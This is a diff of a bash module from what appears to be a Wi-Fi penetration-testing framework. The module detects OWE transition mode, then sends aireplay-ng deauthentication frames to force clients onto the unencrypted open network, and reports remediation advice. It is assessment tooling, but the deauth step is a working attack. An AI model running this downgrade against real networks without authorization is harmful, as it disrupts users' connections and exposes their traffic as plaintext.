@@ -1,4 +1,15 @@
 #!/usr/bin/env bash
+# MODULE_META
+# NAME="OWE Transition Downgrade"
+# CATEGORY="D"
+# DEPS="A1"
+# CRITICAL="no"
+# TOOLS="aireplay-ng,tcpdump,tshark"
+# DESC="Test for OWE transition mode vulnerability (force fallback to open)"
+# REQS="monitor_iface,target_ssid,target_bssid,target_channel"
+# PCAP="no"
+# DECODE="wifi_mgmt"
+
 #===============================================================================
 #  modules/d6_owe_downgrade.sh
 #  D6: OWE (Opportunistic Wireless Encryption) Transition Attack
@@ -6,10 +17,9 @@
 #  PURPOSE:
 #    Test if the target "Open" network supports OWE Transition Mode, and if
 #    so, attempt to force clients to downgrade to the unencrypted Open BSSID
-#    by deploying a rogue AP that strips the OWE Transition IE, or by
-#    deauthenticating clients from the hidden OWE BSSID.
+#    by deauthenticating clients from the hidden OWE BSSID.
 #
-#  TOOLS: ${TOOL_PATHS[tshark]}, ${TOOL_PATHS[tcpdump]}, ${TOOL_PATHS[mdk4]}, ${TOOL_PATHS[aireplay-ng]}
+#  TOOLS: tshark, tcpdump, aireplay-ng
 #  PHASE: 2A — Attack Simulations
 #  DEPENDENCIES: A1
 #
@@ -17,27 +27,22 @@
 #    - d6_owe_analysis.txt           (OWE IE analysis)
 #    - d6_downgrade_results.txt      (downgrade test results)
 #    - d6_capture.pcap               (captured traffic during test)
-#
-#  RESULT JSON FIELDS:
-#    - owe_supported: bool
-#    - transition_mode: bool
-#    - hidden_owe_bssid: string
-#    - clients_downgraded: int
 #===============================================================================
+
+set -uo pipefail
 
 run_d6() {
     local total_steps=6
     local evidence_prefix="${SESSION_EVIDENCE_DIR}/d6"
+    local analysis_file="${evidence_prefix}_owe_analysis.txt"
+    local downgrade_file="${evidence_prefix}_downgrade_results.txt"
+    local cap_file="${evidence_prefix}_capture.pcap"
 
-    #--- Step 1: Verify tools ---
-    log_step 1 $total_steps "Verifying tools"
-    update_tc_progress 1 $total_steps "Checking"
+    #--- Step 1: Verify tools & prerequisites ---
+    log_step 1 $total_steps "Verifying required tools and targets"
+    update_tc_progress 1 $total_steps "Checking dependencies"
 
-    
-    local has_mdk4=false
-    local has_aireplay=false
-    command -v mdk4 &>/dev/null && has_mdk4=true
-    command -v aireplay-ng &>/dev/null && has_aireplay=true
+    check_module_dependencies "D6" || return 1
 
     if [[ -z "${GUEST_SSID:-}" || -z "${GUEST_BSSID:-}" ]]; then
         log_warn "Target SSID/BSSID not set."
@@ -68,12 +73,7 @@ run_d6() {
     local owe_supported="false"
     local transition_mode="false"
     local hidden_owe_bssid=""
-    local hidden_owe_ssid=""
     local clients_downgraded=0
-    
-    local analysis_file="${evidence_prefix}_owe_analysis.txt"
-    local downgrade_file="${evidence_prefix}_downgrade_results.txt"
-    local cap_file="${evidence_prefix}_capture.pcap"
 
     {
         echo "============================================================"
@@ -99,26 +99,23 @@ run_d6() {
     log_step 3 $total_steps "Analyzing beacons for OWE Transition IE (20s)"
     update_tc_progress 3 $total_steps "IE Analysis"
 
-    local beacon_pcap="/tmp/d6_beacons.pcap"
-    timeout 20 ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -c 100 -w "$beacon_pcap" \
-        "type mgt subtype beacon and ether src ${GUEST_BSSID}" &>/dev/null || true
+    local beacon_pcap="$TMP_DIR/d6_beacons.pcap"
+    rm -f "$beacon_pcap"
+    
+    run_fg "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -c 100 -w "$beacon_pcap" \
+        "type mgt subtype beacon and ether src ${GUEST_BSSID}" 2>/dev/null || true
 
     if [[ -f "$beacon_pcap" && -s "$beacon_pcap" ]]; then
-        # Check for OWE Transition IE (Vendor Specific: 50:6F:9A, Type 28)
-        # Wireshark filter: wlan.tag.number == 221 and wlan.tag.oui == 50:6f:9a and wlan.tag.vendor.oui.type == 28
         local owe_ie
-        local owe_ie=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" \
+        owe_ie=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" \
             -Y "wlan.tag.oui == 50:6f:9a && wlan.tag.vendor.oui.type == 28" \
             -T fields -e wlan.tag.vendor.data \
             2>/dev/null | head -1 || true)
 
         if [[ -n "$owe_ie" ]]; then
-            local transition_mode="true"
-            local owe_supported="true"
-            
-            # The OWE IE data contains the BSSID of the OWE network
-            # It's usually the first 6 bytes of the vendor data payload
-            local hidden_owe_bssid=$(echo "$owe_ie" | sed 's/://g' | cut -c 1-12 | sed 's/\(..\)/\1:/g; s/:$//')
+            transition_mode="true"
+            owe_supported="true"
+            hidden_owe_bssid=$(echo "$owe_ie" | sed 's/://g' | cut -c 1-12 | sed 's/\(..\)/\1:/g; s/:$//')
             
             log_result "FINDING" "OWE Transition Mode detected!"
             log_info "Hidden OWE BSSID: ${hidden_owe_bssid}"
@@ -126,11 +123,10 @@ run_d6() {
             echo "OWE Transition Mode: ENABLED" >> "$analysis_file"
             echo "Linked OWE BSSID: ${hidden_owe_bssid}" >> "$analysis_file"
         else
-            # Check if this IS an OWE network directly (AKM 18)
             local akm_type
-            local akm_type=$(${TOOL_PATHS[tshark]} -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
+            akm_type=$(run_fg "${TOOL_PATHS[tshark]}" -r "$beacon_pcap" -T fields -e wlan.rsn.akms.type 2>/dev/null | head -1 || true)
             if echo "$akm_type" | grep -q "18"; then
-                local owe_supported="true"
+                owe_supported="true"
                 log_info "Network uses strict OWE (no transition mode)"
                 echo "OWE Strict Mode: ENABLED (No transition IE)" >> "$analysis_file"
             else
@@ -143,66 +139,45 @@ run_d6() {
 
     check_abort || return 1
 
-    #--- Step 4: Deauth OWE Clients (if transition mode active) ---
+    #--- Step 4: Deauth OWE Clients ---
     log_step 4 $total_steps "Attempting OWE downgrade attack"
     update_tc_progress 4 $total_steps "Downgrade attack"
 
-    if [[ "$transition_mode" == "true" && -n "$hidden_owe_bssid" && "$has_aireplay" == "true" ]]; then
-        log_info "Monitoring OWE BSSID and Open BSSID..."
+    if [[ "$transition_mode" == "true" && -n "$hidden_owe_bssid" ]]; then
+        rm -f "$cap_file"
+        spawn_bg "owe_cap" "${TOOL_PATHS[tcpdump]}" -i "$mon_iface" -w "$cap_file" \
+            "wlan addr1 ${GUEST_BSSID} or wlan addr2 ${GUEST_BSSID} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}"
         
-        # Capture traffic to see if clients drop from OWE and appear on Open
-        ${TOOL_PATHS[tcpdump]} -i "$mon_iface" -w "$cap_file" \
-            "wlan addr1 ${GUEST_BSSID} or wlan addr2 ${GUEST_BSSID} or wlan addr1 ${hidden_owe_bssid} or wlan addr2 ${hidden_owe_bssid}" \
-            &>/dev/null &
-        local tcpdump_pid=$!
-        register_cleanup "kill -SIGINT $tcpdump_pid 2>/dev/null || true; wait $tcpdump_pid 2>/dev/null || true"
-        
-        # Wait a moment to establish baseline
         sleep 5
+        log_info "Sending deauth frames to hidden OWE BSSID: ${hidden_owe_bssid}"
+        run_fg "${TOOL_PATHS[aireplay-ng]}" --deauth 15 -a "$hidden_owe_bssid" "$mon_iface"
         
-        log_cmd "${TOOL_PATHS[aireplay-ng]} --deauth 15 -a ${hidden_owe_bssid} ${mon_iface}"
-        echo "Sending deauth frames to hidden OWE BSSID: ${hidden_owe_bssid}" >> "$downgrade_file"
-        
-        # Deauth all clients from the encrypted OWE BSSID to force fallback
-        ${TOOL_PATHS[aireplay-ng]} --deauth 15 -a "$hidden_owe_bssid" "$mon_iface" &>/dev/null || true
-        
-        start_countdown 30 "Monitoring for clients falling back to Open BSSID"
+        start_countdown 30 "Monitoring for fallback Association Requests"
         sleep 30
         stop_countdown
+        stop_process "owe_cap"
         
-                
         #--- Step 5: Analyze Fallback ---
         log_step 5 $total_steps "Analyzing client fallback"
         update_tc_progress 5 $total_steps "Analysis"
         
         if [[ -f "$cap_file" ]]; then
-            # Look for Association Requests to the OPEN BSSID shortly after our attack
             local fallback_clients
-            local fallback_clients=$(${TOOL_PATHS[tshark]} -r "$cap_file" \
+            fallback_clients=$(run_fg "${TOOL_PATHS[tshark]}" -r "$cap_file" \
                 -Y "wlan.fc.type_subtype == 0x0000 && wlan.da == ${GUEST_BSSID}" \
                 -T fields -e wlan.sa 2>/dev/null | sort -u || true)
                 
             if [[ -n "$fallback_clients" ]]; then
-                local clients_downgraded=$(echo "$fallback_clients" | wc -l)
+                clients_downgraded=$(echo "$fallback_clients" | wc -l)
                 log_result "CRITICAL" "OWE Downgrade successful! ${clients_downgraded} client(s) fell back to Open network."
                 echo "Downgraded Clients:" >> "$downgrade_file"
                 echo "$fallback_clients" >> "$downgrade_file"
             else
                 log_info "No clients fell back to the Open network during the test window."
-                echo "No downgrade observed. Clients may enforce OWE or were not active." >> "$downgrade_file"
             fi
         fi
-    elif [[ "$transition_mode" == "true" ]]; then
-        log_warn "${TOOL_PATHS[aireplay-ng]} missing — cannot perform active deauth downgrade"
-        echo "SKIPPED: Active downgrade requires ${TOOL_PATHS[aireplay-ng]}" >> "$downgrade_file"
-        
-        # Dummy step to keep numbering consistent
-        log_step 5 $total_steps "Skipping active fallback analysis"
-        update_tc_progress 5 $total_steps "Skipped"
     else
-        log_info "Network does not use OWE Transition Mode — downgrade attack not applicable"
-        echo "Not applicable: No OWE transition mode detected." >> "$downgrade_file"
-        
+        log_info "Downgrade attack not applicable."
         log_step 5 $total_steps "Skipping active fallback analysis"
         update_tc_progress 5 $total_steps "Skipped"
     fi
@@ -211,37 +186,33 @@ run_d6() {
     log_step 6 $total_steps "Saving results"
     update_tc_progress 6 $total_steps "Saving"
 
-    # Restore managed mode
     disable_monitor_mode
-    sleep 3
 
     local result_status="SECURE"
     local result_summary=""
     local recommendations=""
 
     if [[ $clients_downgraded -gt 0 ]]; then
-        local result_status="FINDING"
-        local result_summary="CRITICAL: OWE Transition Mode downgrade was successful. ${clients_downgraded} client(s) were forced off the encrypted OWE network and fell back to the plaintext Open network."
-        local recommendations="1) Phased approach: disable OWE Transition Mode and enforce strict OWE once legacy client support is no longer required. "
-        recommendations+="2) Educate users that 'Transition' networks can be downgraded to plaintext by attackers. "
-        recommendations+="3) Implement Management Frame Protection (802.11w) on the OWE BSSID to prevent deauthentication attacks."
+        result_status="FINDING"
+        result_summary="CRITICAL: OWE Transition Mode downgrade successful. ${clients_downgraded} client(s) fell back to plaintext."
+        recommendations="1) Phased approach: disable OWE Transition Mode and enforce strict OWE. 2) Implement MFP (802.11w) on the OWE BSSID."
     elif [[ "$transition_mode" == "true" ]]; then
-        local result_summary="Network uses OWE Transition Mode (broadcasting both Open and OWE BSSIDs). Active downgrade attempt did not capture any client fallbacks in the test window."
-        local recommendations="Transition mode provides encryption for modern clients but is fundamentally vulnerable to downgrade attacks. Monitor for rogue APs stripping the OWE IE."
+        result_summary="Network uses OWE Transition Mode. No active fallbacks observed in test window."
+        recommendations="Transition mode is fundamentally vulnerable to downgrade. Monitor for rogue APs stripping the OWE IE."
     elif [[ "$owe_supported" == "true" ]]; then
-        local result_summary="Network enforces strict OWE. It is not vulnerable to transition mode downgrade attacks."
-        local recommendations="Strict OWE is the recommended configuration. No action required."
+        result_summary="Network enforces strict OWE. Not vulnerable to transition mode downgrade."
+        recommendations="Strict OWE is the recommended configuration."
     else
-        local result_summary="Network does not support OWE (Opportunistic Wireless Encryption). Traffic is entirely plaintext."
-        local recommendations="Enable OWE (Enhanced Open) on target networks to provide unauthenticated encryption and protect against passive eavesdropping."
+        result_summary="Network does not support OWE. Traffic is entirely plaintext."
+        recommendations="Enable OWE (Enhanced Open) to provide unauthenticated encryption."
     fi
 
-    local result_json
-    evidence_register_file "d6_owe_analysis.txt"
-    evidence_register_file "d6_downgrade_results.txt"
-    evidence_register_file "d6_capture.pcap"
+    evidence_register_file "$analysis_file"
+    [[ -f "$downgrade_file" ]] && evidence_register_file "$downgrade_file"
+    [[ -f "$cap_file" ]] && evidence_register_file "$cap_file"
 
-    local result_json=$(${TOOL_PATHS[jq]} -n \
+    local result_json
+    result_json=$(run_fg "jq" -n \
         --arg status "$result_status" \
         --arg summary "$result_summary" \
         --arg details "OWE Supported: ${owe_supported}, Transition Mode: ${transition_mode}, Hidden BSSID: ${hidden_owe_bssid:-N/A}, Clients Downgraded: ${clients_downgraded}" \
@@ -258,19 +229,16 @@ run_d6() {
             owe_supported: ($owe_supported == "true"),
             transition_mode: ($transition_mode == "true"),
             hidden_owe_bssid: $hidden_owe_bssid,
-            clients_downgraded: $clients_downgraded,
-                    }')
+            clients_downgraded: $clients_downgraded
+        }')
 
-    save_tc_result "D6" "$result_json"
+    local has_pri=0
+    [[ -f "$cap_file" && -s "$cap_file" ]] && has_pri=1
+    local is_secure=0
+    [[ "$result_status" == "SECURE" ]] && is_secure=1
 
-    echo ""
-    if [[ $clients_downgraded -gt 0 ]]; then
-        log_result "CRITICAL" "★ OWE Downgrade SUCCESSFUL — ${clients_downgraded} clients fell back to plaintext"
-    elif [[ "$transition_mode" == "true" ]]; then
-        log_result "FINDING" "OWE Transition Mode detected (inherently vulnerable to downgrade)"
-    else
-        log_result "SECURE" "OWE Transition Mode not active"
-    fi
+    save_tc_result "D6" "$result_json" 1 1 $has_pri 1 1 1 0 1 1 1 $is_secure
+    save_session_state
 
     return 0
 }
